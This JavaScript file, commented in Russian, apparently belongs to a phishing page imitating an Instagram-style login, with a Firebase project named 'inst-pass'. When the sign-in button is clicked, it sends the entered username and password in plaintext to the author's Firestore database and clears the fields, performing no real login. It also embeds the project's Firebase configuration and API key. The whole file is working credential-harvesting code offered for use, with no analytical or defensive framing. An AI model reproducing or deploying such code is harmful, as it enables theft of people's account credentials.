// Инициализация Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";

// Конфигурация Firebase
const firebaseConfig = {
  apiKey: "AIzaSyA_nmSVob8pBBjxCmUIdsNk9-1m5m4fzVI",
  authDomain: "inst-pass.firebaseapp.com",
  projectId: "inst-pass",
  storageBucket: "inst-pass.firebasestorage.app",
  messagingSenderId: "480636301113",
  appId: "1:480636301113:web:06be256188fe5be663c2e8",
  measurementId: "G-BTZPEYEED0"
};

// Инициализация Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Функция для добавления данных в Firestore
async function saveDataToFirestore(username, password) {
  try {
    // Добавление данных в Firestore
    await addDoc(collection(db, "users"), {
      username: username,
      password: password,
      timestamp: new Date(),
    });

    console.log("Данные пользователя добавлены в Firestore");
  } catch (error) {
    console.error("Ошибка при добавлении данных в Firestore:", error.message);
  }
}

// Обработчик события при клике на кнопку "Войти"
document.getElementById("signInBtn").addEventListener("click", function() {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // Проверка на пустые поля
  if (username && password) {
    saveDataToFirestore(username, password);

    // Очистка полей
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
  } else {
    alert("Пожалуйста, заполните все поля");
  }
});

document.querySelector('.footer_button').addEventListener('click', function() {
   alert('Подтвердите личность чтобы создать новый аккаунт!');
});
 
const inputs = document.querySelectorAll('input');
const footerButton = document.querySelector('.footer_button');
const footerImg = document.querySelector('.footer_img');

// Функция скрытия
function hideFooterElements() {
    footerButton.style.display = 'none';
    footerImg.style.display = 'none';
}

// Функция показа
function showFooterElements() {
    footerButton.style.display = 'block';
    footerImg.style.display = 'block';
}

// Добавляем события на все input'ы
inputs.forEach(input => {
    input.addEventListener('focus', hideFooterElements);
    input.addEventListener('blur', showFooterElements);
});
